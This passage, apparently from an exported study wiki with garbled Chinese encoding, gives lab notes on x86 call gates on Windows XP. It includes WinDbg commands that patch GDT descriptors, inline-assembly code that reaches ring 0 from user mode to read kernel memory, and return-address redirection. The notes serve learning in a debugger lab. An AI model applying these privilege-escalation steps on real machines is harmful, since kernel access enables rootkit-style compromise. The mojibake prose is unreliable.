getchar(); return 0;&#125;ä¸‹æ–­ç‚¹ï¼ŒæŸ¥çœ‹è£¸å‡½æ•°åœ°å€ï¼Œé‡æ–°æ„é€ è°ƒç”¨é—¨æè¿°ç¬¦ï¼Œä¿®æ”¹GDTè¡¨æ‰§è¡Œè¡¥å……ï¼šæœ‰ä¸ªç»†èŠ‚ä¿®æ­£ä¸‹ï¼ŒsgdtæŒ‡ä»¤å…¶å®åœ¨3ç¯ä¸‹ä¹Ÿèƒ½ç”¨ã€‚SGDT is useful only by operating-system software. However, it can be used in application programs without causing an exception to be generated.Fromï¼šIntelÂ® 64 and IA-32 ArchitecturesSoftware Developerâ€™s ManualVolume 2B:Instruction Set Reference, N-ZéªŒè¯ä»£ç åœ¨VCä¸­ç¼–è¯‘æ‰§è¡Œ12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;windows.h&gt;BYTE GDT[6]=&#123;0&#125;;//åˆ‡æ¢å †æ ˆåæ‰§è¡Œçš„ä»£ç void __declspec(naked) GetRegister()&#123; __asm &#123; sgdt GDT //è¯»GDTRå¯„å­˜å™¨ ret &#125;&#125;void PrintRegister()&#123; DWORD GDT_ADDR=*(PDWORD)(&amp;GDT[2]); WORD GDT_LIMIT=*(PWORD)(&amp;GDT[0]); printf(&quot;%x %x &quot;,GDT_ADDR,GDT_LIMIT);&#125;int main()&#123; GetRegister(); PrintRegister(); getchar(); return 0;&#125; æœ‰å‚è°ƒç”¨é—¨ å®éªŒ1ï¼šæ„é€ æœ‰å‚çš„è°ƒç”¨é—¨ï¼Œå®ç°ææƒåæ­£ç¡®ä¾æ¬¡å–å‡ºå‚æ•°å¹¶åˆ†æå †æ ˆæƒ…å†µ å®éªŒè¿‡ç¨‹æ„é€ è°ƒç”¨é—¨æè¿°ç¬¦å¹¶å†™å…¥GDTè¡¨VC++æŸ¥çœ‹åˆ°åˆ‡æ¢å †æ ˆåçš„å‡½æ•°åœ°å€æ˜¯ï¼š0040 de60ä¼ é€’å‚æ•°ä¸ªæ•°3å®Œæ•´ï¼š0040EC03`0008de60å°†è‡ªå·±æ„é€ çš„è°ƒç”¨é—¨åŠ å…¥GDTè¡¨ä¸­ï¼š1234567891011121314kd&gt; dq 8003f000 LA8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 00000000`00000000kd&gt; eq 8003f048 0040EC03`0008de60kd&gt; dq 8003f000 LA8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 0040ec03`0008de60kd&gt; gæµ‹è¯•ä»£ç ä»£ç åˆ†æï¼šå£°æ˜äº†ä¸‰ä¸ªå…¨å±€å˜é‡x,y,zã€‚è°ƒç”¨é—¨æœ‰å‚ï¼Œcallå‰æ‰‹åŠ¨å‹å…¥ä¸‰ä¸ªå‚æ•°ï¼Œåœ¨è°ƒç”¨é—¨ä¸­åˆ†åˆ«å°†ä¹‹å‰å‹çš„è¿™ä¸‰ä¸ªå‚æ•°èµ‹å€¼ç»™å…¨å±€å˜é‡x,y,zä¸­ã€‚ç„¶åæ‰“å°è¿™ä¸‰ä¸ªå€¼12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;stdio.h&gt;#include &lt;windows.h&gt;DWORD x;DWORD y;DWORD z;void _declspec(naked) GateProc()&#123; _asm &#123; pushad pushfd mov eax,[esp+0x24+0x8+0x8] mov dword ptr ds:[x],eax mov eax,[esp+0x24+0x8+0x4] mov dword ptr ds:[y],eax mov eax,[esp+0x24+0x8+0x0] mov dword ptr ds:[z],eax popfd popad retf 0xC //æ³¨æ„å †æ ˆå¹³è¡¡ï¼Œé˜²æ­¢è“å± &#125;&#125;void PrintArgs()&#123; printf(&quot;%x %x %x&quot;,x,y,z);&#125;int main()&#123; char buff[6]; *(DWORD*)&amp;buff[0] = 0x12345678; *(DWORD*)&amp;buff[4] = 0x4B; _asm &#123; push 1 push 2 push 3 call fword ptr[buff] &#125; PrintArgs(); getchar(); return 0;&#125;æ‰§è¡ŒåŠç»“æœåˆ†æå †æ ˆåˆ†æï¼šå†…è”æ±‡ç¼–é‚£åŠ ä¸ªint 3æ–­ç‚¹12345678910111213141516171819_asm&#123; int 3 pushad pushfd mov eax,[esp+0x24+0x8+0x8] mov dword ptr ds:[x],eax mov eax,[esp+0x24+0x8+0x4] mov dword ptr ds:[y],eax mov eax,[esp+0x24+0x8+0x0] mov dword ptr ds:[z],eax popfd popad retf 0xC //æ³¨æ„å †æ ˆå¹³è¡¡ï¼Œé˜²æ­¢è“å±&#125;æ‰§è¡Œï¼Œä¼šåœ¨windbgä¸­æ–­ä¸‹æ¥ã€‚ç„¶åæŸ¥çœ‹å †æ ˆæƒ…å†µä»£ç åˆ†æï¼š1234567891011121314151617181920void _declspec(naked) GateProc()&#123; _asm &#123; pushad pushfd mov eax,[esp+0x24+0x8+0x8] mov dword ptr ds:[x],eax mov eax,[esp+0x24+0x8+0x4] mov dword ptr ds:[y],eax mov eax,[esp+0x24+0x8+0x0] mov dword ptr ds:[z],eax popfd popad retf 0xC //æ³¨æ„å †æ ˆå¹³è¡¡ï¼Œé˜²æ­¢è“å± &#125;&#125;0x24ï¼šæ˜¯åå…­è¿›åˆ¶çš„36ï¼Œå› ä¸ºå‰é¢çš„pushadä¼šå°†8ä¸ª32ä½å¯„å­˜å™¨å‹å…¥å †æ ˆä¸­ï¼Œå³32ä¸ªå­—èŠ‚ã€‚pushfdå°†EFLAGå¯„å­˜å™¨å‹å…¥å †æ ˆä¸­ï¼Œä¹Ÿæ˜¯4ä¸ªå­—èŠ‚ï¼Œæ€»å’Œå³ä¸º36ä¸ªå­—èŠ‚ã€‚0x8ï¼šè¿”å›åœ°å€å’ŒCSæ‰€å çš„æ€»å­—èŠ‚æ•°ã€‚ è€ƒè¯•é¢˜ æ„é€ â€”ä¸ªè°ƒç”¨é—¨ï¼Œå®ç°3ç¯è¯»å–é«˜2Gå†…å­˜ã€‚ åœ¨ç¬¬ä¸€é¢˜çš„åŸºç¡€ä¸Šè¿›è¡Œä¿®æ”¹,å®ç°é€šè¿‡ç¿»å¢™çš„æ–¹å¼è¿”å›åˆ°å…¶ä»–åœ°å€ã€‚ åœ¨ç¬¬ä¸€é¢˜çš„åŸºç¡€ä¸Šè¿›è¡Œä¿®æ”¹,åœ¨é—¨ä¸­å†å»ºä¸€ä¸ªé—¨è·³è½¬åˆ°å…¶ä»–åœ°å€ã€‚ ï¼ˆä»¥æ— å‚è°ƒç”¨é—¨æ¥åšå®éªŒï¼‰ é¢˜ç›®2ç­”æ¡ˆæ€è·¯ï¼šææƒåè¿”å›å‰æŠŠå †æ ˆä¸­çš„è¿”å›åœ°å€æ”¹æˆè¦å»çš„åœ°æ–¹é—¨æè¿°ç¬¦çš„æ„é€ ï¼š0040EC00`00081030VCæŸ¥çœ‹è·³è½¬å‡½æ•°PrintRegister_Myçš„åœ°å€æ˜¯ï¼š004010A0æµ‹è¯•ä»£ç ï¼š12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;stdio.h&gt;#include &lt;windows.h&gt;DWORD dwH2GValue;//åˆ‡æ¢å †æ ˆåæ‰§è¡Œçš„ä»£ç void __declspec(naked) GetRegister()&#123; __asm &#123; //int 3 //è®©æ–­ç‚¹åœåœ¨windbgï¼Œè®©æˆ‘ä»¬åˆ†æä¸‹å¯„å­˜å™¨å’Œå †æ ˆ pushad pushfd mov eax,0x8003f00c //è¯»å–é«˜2Gçš„åœ°å€ mov ebx,[eax] mov dwH2GValue,ebx //mov dword ptr [esp+0x24],0x4010A0; //ä¿®æ”¹å †æ ˆä¸­çš„è¿”å›åœ°å€ popfd popad retf //æ³¨æ„è¿”å›ï¼Œä¸èƒ½æ˜¯ret &#125;&#125;void PrintRegister_Main()&#123; printf(&quot;%x,Printed by PrintRegister_Main function &quot;,dwH2GValue);&#125;int PrintRegister_My()&#123; printf(&quot;%x,Printed by PrintRegister_My function &quot;,dwH2GValue); return 0;&#125;int main()&#123; char buff[6]; *(DWORD*)&amp;buff[0]=0x12345678; //ä½4å­—èŠ‚ï¼ŒEIPï¼Œå¯ä»¥éšä¾¿å†™ *(WORD*)&amp;buff[4]=0x48; //é«˜16ä½ï¼Œæ®µé€‰æ‹©å­ã€‚0x48æ‹†å®Œç´¢å¼•åˆ°çš„æ˜¯åˆšæ‰ä¿®æ”¹çš„8003f048ï¼Œä¸­æ–­é—¨æè¿°ç¬¦ __asm &#123; call fword ptr[buff]; //é•¿è°ƒç”¨ï¼Œéœ€è¦6ä¸ªå­—èŠ‚ &#125; PrintRegister_Main(); getchar(); return 0;&#125;æ­£å¸¸æ‰§è¡Œæµç¨‹ä¿®æ”¹å †æ ˆåç¦»å¼€ é¢˜ç›®3ç­”æ¡ˆè¿™é‡Œæˆ‘ä»¬æ‹“å±•ï¼Œå¤šæ„é€ å‡ ä¸ªé—¨æè¿°ç¬¦ï¼Œéƒ½è¯•ä¸€ä¸‹ç¬¬ä¸€ä¸ªé—¨æè¿°ç¬¦éƒ½æ˜¯0040EC00`00081030åºå·ç¬¬äºŒä¸ªé—¨æè¿°ç¬¦çš„å€¼é—¨æè¿°ç¬¦ä¸­çš„æ®µé€‰æ‹©å­é—¨æè¿°ç¬¦ä¸­æŒ‡å‘çš„ä»£ç æ®µè°ƒç”¨æ–¹å¼è®¾è®¡ç›®çš„æ‰§è¡Œç»“æœ10040EC00`000810500008indexæ˜¯1ï¼Œ0ç¯ä»£ç æ®µcall0ç¯è·³0ç¯ï¼ŒåŒä¸€ä¸ªä»£ç æ®µ0ç¯è·³0ç¯ï¼Œå¯ä»¥20040EC00`001B10500018indexæ˜¯3ï¼Œ3ç¯ä»£ç æ®µcall0ç¯è·³ä¸€ä¸ª3ç¯ä»£ç æ®µ0ç¯è·³3ç¯ï¼Œå¼‚å¸¸è“å±30040EC00`007810500078indexæ˜¯15ï¼Œ0ç¯ä»£ç æ®µcall0ç¯è·³å¦ä¸€ä¸ª0ç¯ä»£ç æ®µç†è®º0ç¯è·³0ç¯ï¼Œå¯ä»¥ã€‚è§ä¸‹é¢&gt;å†…å®¹ï¼Œä¼šå¼¹çª—è¯´é‡åˆ°é—®é¢˜éœ€è¦å…³é—­ä»£ç æ®µï¼šåºå·åœ°å€æ®µæè¿°ç¬¦æ•°æ®æ®µorä»£ç æ®µDPL18003f00800cf9b00`0000ffffä»£ç æ®µ0038003f01800cffa00`0000ffffä»£ç æ®µ11158003f07880009a40`0000ffffä»£ç æ®µ00308003f0f08000984f`b68803b7ä»£ç æ®µ00åºå·15å’Œåºå·30ä»£ç æ®µï¼Œæˆ‘ç”¨ä¹‹å‰3ç¯è·³0ç¯è¯»é«˜2Gå†…å­˜åœ°å€çš„æµ‹è¯•ä»£ç æ‰§è¡Œï¼Œä¼šæœ‰é—®é¢˜ã€‚ä¸çŸ¥é“æ˜¯ä»€ä¹ˆåŸå› ï¼Œæ‰€ä»¥é¢˜ç›®3è¿™é‡Œå°±åªç”¨åºå·1è¿™ä¸ªä»£ç æ®µåºå·15çš„æ®µé€‰æ‹©å­ï¼š0078åºå·30çš„æ®µé€‰æ‹©å­ï¼š00C0åºå·1ï¼š0ç¯è·³0ç¯ï¼ŒåŒä¸€ä¸ªä»£ç æ®µç¬¬ä¸€ä¸ªé—¨æè¿°ç¬¦ï¼š0040EC00`00081030ç¬¬äºŒä¸ªé—¨æè¿°ç¬¦ï¼š0040EC00`00081050ä¿®æ”¹GDTè¡¨ï¼šå¯»ç¬¬ä¸€ä¸ªé—¨æè¿°ç¬¦ä½ç½®8003f048çš„æ®µé€‰æ‹©å­ï¼š0x48å¯»ç¬¬äºŒä¸ªé—¨æè¿°ç¬¦ä½ç½®8003f098çš„æ®µé€‰æ‹©å­ï¼š0x9812kd&gt; eq 8003f048 0040EC00`00081030kd&gt; eq 8003f098 0040EC00`0008105012345678910111213141516171819202122232425kd&gt; dq 8003f000 L148003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 00000000`000000008003f050 80008954`af000068 80008954`af6800688003f060 00009302`2f40ffff 0000920b`80003fff8003f070 ff0092ff`700003ff 80009a40`0000ffff8003f080 80009240`0000ffff 00009200`000000008003f090 00000000`00000000 00000000`00000000kd&gt; eq 8003f048 0040EC00`00081030kd&gt; eq 8003f098 0040EC00`00081050kd&gt; dq 8003f000 L148003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 0040ec00`000810308003f050 80008954`af000068 80008954`af6800688003f060 00009302`2f40ffff 0000920b`80003fff8003f070 ff0092ff`700003ff 80009a40`0000ffff8003f080 80009240`0000ffff 00009200`000000008003f090 00000000`00000000 0040ec00`00081050kd&gt; gæµ‹è¯•ä»£ç æ‰§è¡Œç»“æœ12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include &lt;stdio.h&gt;#include &lt;windows.h&gt;DWORD dwH2GValue;BOOL bFunc1BeCalled;BOOL bFunc2BeCalled;char gate1[6] = &#123;0, 0, 0, 0, 0x48, 0&#125;;//8003f048 0040EC00`00081030char gate2[6] = &#123;0, 0, 0, 0, 0x98, 0&#125;;//8003f098 0040EC00`00081050// è£¸å‡½æ•°1void __declspec(naked) Func1() //00401030 &#123; __asm &#123; // int 3 pushad pushfd mov eax,10 mov dword ptr ds:[bFunc1BeCalled],eax //BOOLæ˜¯intç±»å‹ï¼Œ32ä½ã€‚ç”¨dword call fword ptr ds:[gate2]; // é•¿è°ƒç”¨ï¼Œéœ€è¦6ä¸ªå­—èŠ‚ popfd popad retf // æ³¨æ„è¿”å›ï¼Œä¸èƒ½æ˜¯ret &#125;&#125;// è£¸å‡½æ•°2void __declspec(naked) Func2() //00401050 &#123; __asm &#123; // int 3 pushad pushfd mov eax,0x8003f00c //è¯»å–é«˜2Gçš„åœ°å€ mov ebx,[eax] mov dwH2GValue,ebx mov eax,20 mov dword ptr ds:[bFunc2BeCalled],eax popfd popad retf //æ³¨æ„è¿”å›ï¼Œä¸èƒ½æ˜¯ret &#125;&#125;int main()&#123; printf(&quot;%d %d &quot;, bFunc1BeCalled,bFunc2BeCalled); // char buff[6]; // *(DWORD *)&amp;buff[0] = 0x12345678; // ä½4å­—èŠ‚ï¼ŒEIPï¼Œå¯ä»¥éšä¾¿å†™ // *(WORD *)&amp;buff[4] = 0x48; // é«˜16ä½ï¼Œæ®µé€‰æ‹©å­ã€‚0x48æ‹†å®Œç´¢å¼•åˆ°çš„æ˜¯åˆšæ‰ä¿®æ”¹çš„8003f048ï¼Œä¸­æ–­é—¨æè¿°ç¬¦ __asm &#123; call fword ptr ds:[gate1]; // é•¿è°ƒç”¨ï¼Œéœ€è¦6ä¸ªå­—èŠ‚ &#125; // PrintRegister_Main(); printf(&quot;%x &quot;,dwH2GValue); printf(&quot;%d %d &quot;, bFunc1BeCalled,bFunc2BeCalled); getchar(); return 0;&#125;ä»£ç åˆ†æï¼šåŠŸèƒ½ä¸¤ä¸ªå…¨å±€å˜é‡bFunc1BeCalledå’ŒbFunc2BeCalledï¼Œåˆ†åˆ«åœ¨è£¸å‡½æ•°é‡Œèµ‹å€¼ã€‚mainå‡½æ•°ä¸­æœ‰ä¸¤æ¬¡æ‰“å°è¾“å‡ºï¼Œç¬¬ä¸€æ¬¡æ˜¯callå‰æ‰“å°çœ‹ä¸¤ä¸ªå˜é‡åŸå§‹å€¼ï¼Œéƒ½æ˜¯0ï¼›ç¬¬äºŒæ¬¡æ‰“å°è¾“å‡ºæ˜¯callå®Œï¼Œåˆ†åˆ«æ˜¯10ï¼Œ20ã€‚æ²¡è“å±ï¼Œè¯æ˜å®éªŒæˆåŠŸã€‚ç¬¬äºŒä¸ªè£¸å‡½æ•°é‡Œè¯»é«˜2Gå†…å­˜ï¼Œè¯æ˜è¿˜æ˜¯0ç¯æƒé™BOOLæ˜¯intç±»å‹ï¼Œ32ä½ï¼Œè£¸å‡½æ•°é‡Œç”¨dword ptråºå·2ï¼š0ç¯è·³ä¸€ä¸ª3ç¯ä»£ç æ®µä¿®æ”¹ç¬¬äºŒä¸ªé—¨æè¿°ç¬¦é‡Œå»çš„ä»£ç æ®µï¼Œå»3ç¯ä»£ç æ®µ8003f098 0040EC00`00081050æ”¹æˆ8003f098 0040EC00`00181050ï¼Œå»3ç¯ä»£ç æ®µåºå·åœ°å€æ®µæè¿°ç¬¦æ•°æ®æ®µorä»£ç æ®µDPL38003f01800cffa00`0000ffffä»£ç æ®µ11è¿è¡Œç»“æœï¼šç»“æœå¼‚å¸¸ï¼Œè¾“å…¥gåè“å±é‡å¯è¿è¡Œæˆªå›¾Windbgè¾“å‡º1234567891011121314151617181920212223242526272829303132333435363738394041424344454647kd&gt; g*** Fatal System Error: 0x0000007f (0x0000000D,0x00000000,0x00000000,0x00000000)Break instruction exception - code 80000003 (first chance)A fatal system error has occurred.Debugger entered on first try; Bugcheck callbacks have not been invoked.A fatal system error has occurred.Connected to Windows XP 2600 x86 compatible target at (Fri Jun 30 18:17:17.014 2023 (UTC + 8:00)), ptr64 FALSELoading Kernel Symbols.............................................................................Press ctrl-c (cdb, kd, ntsd) or ctrl-break (windbg) to abort symbol loads that take too long.Run !sym noisy before .reload to track down problems loading symbols.............................................Loading User Symbols...Loading unloaded module list...........ERROR: FindPlugIns 8007007b******************************************************************************** ** Bugcheck Analysis ** ********************************************************************************Use !analyze -v to get detailed debugging information.BugCheck 7F, &#123;d, 0, 0, 0&#125;*** WARNING: Unable to verify checksum for 2callgate.exe*** ERROR: Module load completed but symbols could not be loaded for 2callgate.exeProbably caused by : ntkrnlpa.exe ( nt!KiSystemFatalException+f )Followup: MachineOwner---------nt!RtlpBreakWithStatusInstruction:80528bdc cc int 3Net COM port baud is ignoredåºå·3:0ç¯è·³å¦ä¸€ä¸ª0ç¯ä»£ç æ®µç¬¬ä¸€ä¸ªé—¨æè¿°ç¬¦ï¼š0040EC00`00081030ç¬¬äºŒä¸ªé—¨æè¿°ç¬¦ï¼š0040EC00`00781050ç†è®ºä¸Šå¯ä»¥ï¼Œä½†æ˜¯ä¸çŸ¥ä¸ºå•¥å¼‚å¸¸äº†ï¼Œè¾“å…¥gåè“å±å°ç»“callå¯ä»¥è°ƒç”¨è°ƒç”¨é—¨ã€‚å¯¹åº”ä»£ç æ®µå’ŒCPLæƒé™å¯¹æ¯”æƒ…å†µå¯¹åº”ä»£ç æ®µæ¯”CPLæƒé™é«˜æ—¶è‡ªåŠ¨ææƒï¼Œå †æ ˆå­˜å‚¨EIP CS å‚æ•° ESP SSå¯¹åº”ä»£ç æ®µæ¯”CPLæƒé™ä½æ—¶è§¦å‘å¼‚å¸¸ï¼Œè“å±æƒé™ç›¸åŒæ—¶æ‰§è¡Œæ­£å¸¸ï¼Œæƒé™ä¸å˜ ç»ƒä¹ ï¼šjmpè·³è°ƒç”¨é—¨ åŒæƒjmp ææƒjmp é™æƒjmp è¿‡ç¨‹åŒæƒjmp0ç¯è·³0ç¯ä¿®æ”¹çš„GDTæè¿°ç¬¦ï¼š12kd&gt; eq 8003f048 0040EC00`00081020kd&gt; eq 8003f098 0040EC00`0008103Dæµ‹è¯•ä»£ç ä»£ç è®¾è®¡åŠåˆ†ææ‰§è¡Œç»“æœ12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;stdio.h&gt;#include &lt;windows.h&gt;DWORD dwH2GValue;BOOL bFlag;char gateforcall[6] = &#123;0, 0, 0, 0, 0x48, 0&#125;;//8003f048 0040EC00`00081020char gateforjmp[6] = &#123;0, 0, 0, 0, 0x98, 0&#125;;//8003f098 0040EC00`0008103D//åˆ‡æ¢å †æ ˆåæ‰§è¡Œçš„ä»£ç void __declspec(naked) GetRegister() //00401020&#123; __asm &#123; //int 3 pushad pushfd mov eax,0x8003f00c //è¯»å–é«˜2Gçš„åœ°å€ mov ebx,[eax] mov dwH2GValue,ebx jmp fword ptr ds:[gateforjmp] //ä¸æ‰§è¡Œ mov dword ptr ds:[bFlag],ebx //0040103D popfd //jmpåˆ°è¿™é‡Œ popad retf //æ³¨æ„è¿”å›ï¼Œä¸èƒ½æ˜¯ret &#125;&#125;int main()&#123; printf(&quot;%d &quot;,bFlag); __asm &#123; call fword ptr ds:[gateforcall]; //é•¿è°ƒç”¨ï¼Œéœ€è¦6ä¸ªå­—èŠ‚ &#125; printf(&quot;%x %d &quot;,dwH2GValue,bFlag); getchar(); return 0;&#125;ä»£ç è®¾è®¡ï¼šåœ¨0ç¯ä¸­ï¼ŒåŸæ„å°†ebxçš„å€¼åˆ†åˆ«èµ‹ç»™dwH2GValueå’Œå˜é‡bFalgï¼Œä½†æ˜¯èµ‹å€¼ç»™bFlagé‚£å¥ç”¨jmpè·³è¿‡ï¼Œç­‰äºæ²¡æ‰§è¡Œã€‚ç¬¬ä¸€æ¬¡å±å¹•æ‰“å°è¾“å‡ºbFlagçš„åˆå§‹å€¼ï¼Œæ˜¯0ã€‚ç„¶åæ‰“å°dwH2GValueï¼ŒbFlagã€‚åˆ†æï¼šå¦‚æœbFlagç¬¬äºŒæ¬¡æ‰“å°çš„å€¼æ˜¯0ï¼Œä¸”æ²¡è“å±ï¼Œè¡¨ç¤ºjmpæŒ‡ä»¤æ‰§è¡ŒæˆåŠŸï¼ŒæˆåŠŸä»0ç¯è·³åˆ°0ç¯ã€‚ææƒjmpæµ‹è¯•ä»£ç è¿è¡Œç»“æœ1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;stdio.h&gt;#include &lt;windows.h&gt;BYTE GDT[6]=&#123;0&#125;;DWORD dwH2GValue;//åˆ‡æ¢å †æ ˆåæ‰§è¡Œçš„ä»£ç void __declspec(naked) GetRegister() //00401030&#123; __asm &#123; //int 3 //è®©æ–­ç‚¹åœåœ¨windbgï¼Œè®©æˆ‘ä»¬åˆ†æä¸‹å¯„å­˜å™¨å’Œå †æ ˆ pushad pushfd mov eax,0x8003f00c //è¯»å–é«˜2Gçš„åœ°å€ mov ebx,[eax] mov dwH2GValue,ebx sgdt GDT //è¯»GDTRå¯„å­˜å™¨ popfd popad retf //æ³¨æ„è¿”å›ï¼Œä¸èƒ½æ˜¯ret &#125;&#125;void PrintRegister()&#123; DWORD GDT_ADDR=*(PDWORD)(&amp;GDT[2]); WORD GDT_LIMIT=*(PWORD)(&amp;GDT[0]); printf(&quot;%x %x %x &quot;,dwH2GValue,GDT_ADDR,GDT_LIMIT);&#125;int main()&#123; // __asm //è¿™é‡Œæˆ‘æ²¡çœ‹æ˜ç™½å¹²å˜›å‘¢ï¼Œæ³¨é‡Šæ‰VCç¼–è¯‘å°±ä¸æŠ¥é”™äº† // &#123; // mov ebx,ebx // mov ebx,ebx // &#125; char buff[6]; *(DWORD*)&amp;buff[0]=0x12345678; //ä½4å­—èŠ‚ï¼ŒEIPï¼Œå¯ä»¥éšä¾¿å†™ *(WORD*)&amp;buff[4]=0x48; //é«˜16ä½ï¼Œæ®µé€‰æ‹©å­ã€‚0x48æ‹†å®Œç´¢å¼•åˆ°çš„æ˜¯åˆšæ‰ä¿®æ”¹çš„8003f048ï¼Œä¸­æ–­é—¨æè¿°ç¬¦ __asm &#123; jmp fword ptr[buff]; //é•¿è°ƒç”¨ï¼Œéœ€è¦6ä¸ªå­—èŠ‚ &#125; PrintRegister(); getchar(); return 0;&#125;ä»£ç ä»åœ¨3ç¯ï¼Œä¸ä¼šè“å±é™æƒjmpåªæ”¹äº†ç¬¬äºŒä¸ªé—¨æè¿°ç¬¦ï¼Œæ”¹ä¸º3ç¯ä»£ç æ®µåºå·åœ°å€æ®µæè¿°ç¬¦æ•°æ®æ®µorä»£ç æ®µDPL38003f01800cffa00`0000ffffä»£ç æ®µ1112kd&gt; eq 8003f048 0040EC00`00081020kd&gt; eq 8003f098 0040EC00`0018103Dæµ‹è¯•ä»£ç è¿è¡Œç»“æœ12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;stdio.h&gt;#include &lt;windows.h&gt;DWORD dwH2GValue;BOOL bFlag;char gateforcall[6] = &#123;0, 0, 0, 0, 0x48, 0&#125;;//8003f048 0040EC00`00081020char gateforjmp[6] = &#123;0, 0, 0, 0, 0x98, 0&#125;;//8003f098 0040EC00`0018103D//åˆ‡æ¢å †æ ˆåæ‰§è¡Œçš„ä»£ç void __declspec(naked) GetRegister() //00401020&#123; __asm &#123; //int 3 //è®©æ–­ç‚¹åœåœ¨windbgï¼Œè®©æˆ‘ä»¬åˆ†æä¸‹å¯„å­˜å™¨å’Œå †æ ˆ pushad pushfd mov eax,0x8003f00c //è¯»å–é«˜2Gçš„åœ°å€ mov ebx,[eax] mov dwH2GValue,ebx jmp fword ptr ds:[gateforjmp] //ä¸æ‰§è¡Œ mov dword ptr ds:[bFlag],ebx //0040103D popfd //jmpåˆ°è¿™é‡Œ popad retf //æ³¨æ„è¿”å›ï¼Œä¸èƒ½æ˜¯ret &#125;&#125;int main()&#123; printf(&quot;%d &quot;,bFlag); __asm &#123; call fword ptr ds:[gateforcall]; //é•¿è°ƒç”¨ï¼Œéœ€è¦6ä¸ªå­—èŠ‚ &#125; printf(&quot;%x %d &quot;,dwH2GValue,bFlag); getchar(); return 0;&#125;å¡ä½ï¼Œwindbgè¾“å…¥gåè“å±å°ç»“å¦‚æœæƒé™ç›¸åŒï¼Œåˆ™æ‰§è¡Œæ²¡é—®é¢˜ï¼Œå †æ ˆé‡Œæ²¡æœ‰å€¼ã€‚å¦‚æœæ¶‰åŠææƒï¼Œåˆ™ä¼šC005è®¿é—®å¼‚å¸¸ï¼Œä»£ç ä»åœ¨3ç¯ï¼Œä¸ä¼šè“å±ã€‚å¦‚æœæ¶‰åŠé™æƒï¼Œåˆ™ä¼šè“å±ã€‚callå’Œjmpå°ç»“callå¯ä»¥è°ƒç”¨è°ƒç”¨é—¨ã€‚å¯¹åº”ä»£ç æ®µæ¯”CPLæƒé™é«˜æ—¶ï¼Œè‡ªåŠ¨ææƒï¼Œå †æ ˆå­˜å‚¨EIP CS å‚æ•° ESP SSã€‚å¯¹åº”ä»£ç æ®µæ¯”CPLæƒé™ä½æ—¶ï¼Œä¼šè§¦å‘å¼‚å¸¸ï¼Œè“å±ã€‚æƒé™ç›¸åŒæ—¶ï¼Œæ‰§è¡Œæ­£å¸¸ï¼Œæƒé™ä¸å˜ã€‚jmpå¯ä»¥è·³è°ƒç”¨é—¨ã€‚å¦‚æœæƒé™ç›¸åŒï¼Œåˆ™æ‰§è¡Œæ²¡é—®é¢˜ï¼Œå †æ ˆé‡Œæ²¡æœ‰å€¼ã€‚å¦‚æœæ¶‰åŠææƒï¼Œåˆ™ä¼šC005è®¿é—®å¼‚å¸¸ï¼Œä»£ç ä»åœ¨3ç¯ï¼Œä¸ä¼šè“å±ã€‚å¦‚æœæ¶‰åŠé™æƒï¼Œåˆ™ä¼šè“å±ã€‚ æ€»ç»“ å½“é€šè¿‡é—¨,æƒé™ä¸å˜çš„æ—¶å€™ï¼Œåªä¼šPUSHä¸¤ä¸ªå€¼:CSå’Œè¿”å›åœ°å€ã€‚æ–°çš„CSçš„å€¼ç”±è°ƒç”¨é—¨å†³å®š å½“é€šè¿‡é—¨,æƒé™æ”¹å˜çš„æ—¶å€™ï¼Œä¼šPUSHå››ä¸ªå€¼:SSï¼ŒESPï¼ŒCSï¼Œè¿”å›åœ°å€ã€‚æ–°çš„CSçš„å€¼ç”±è°ƒç”¨é—¨å†³å®šï¼Œæ–°çš„SSå’ŒESPç”±TSSæä¾› é€šè¿‡é—¨è°ƒç”¨æ—¶ï¼Œè¦æ‰§è¡Œå“ªè¡Œä»£ç ç”±è°ƒç”¨é—¨å†³å®š,ä½†ä½¿ç”¨RETFè¿”å›æ—¶ï¼Œç”±å †æŸ±ä¸­å‹å…¥çš„å€¼å†³å®šï¼Œè¿™å°±æ˜¯è¯´ï¼Œè¿›é—¨æ—¶åªèƒ½æŒ‰æŒ‡å®šè·¯çº¿ï¼ˆæŒ‰é—¨æè¿°ç¬¦ä¸Šè·³è½¬çš„åœ°å€ï¼‰èµ°,å‡ºé—¨æ—¶å¯ä»¥ç¿»å¢™(æ”¹å˜å †æ ˆçš„å€¼ç„¶åå¼¹æ ˆï¼Œå°±å¯ä»¥æƒ³å»å“ªå»å“ª) å¯ä¸å¯ä»¥å†å»ºä¸ªé—¨å‡ºå»å‘¢?ä¹Ÿå°±æ˜¯ç”¨Callã€‚å½“ç„¶å¯ä»¥ï¼Œå‰é—¨è¿›ï¼Œåœ¨é—¨é‡Œå†callå¦ä¸€ä¸ªé—¨å‡ºå»"},{"title":"é™·é˜±é—¨","path":"/wiki/Protected_Mode/é™·é˜±é—¨.html","content":"é™·é˜±é—¨æè¿°ç¬¦ ç»“æ„å›¾ é™·é˜±é—¨çš„ç»“æ„å’Œä¸­æ–­é—¨ç»“æ„å‡ ä¹ä¸€æ ·ï¼šDä½ã€ä¸èƒ½ä¼ å‚ã€è°ƒç”¨æ–¹å¼ä¹Ÿæ˜¯INT 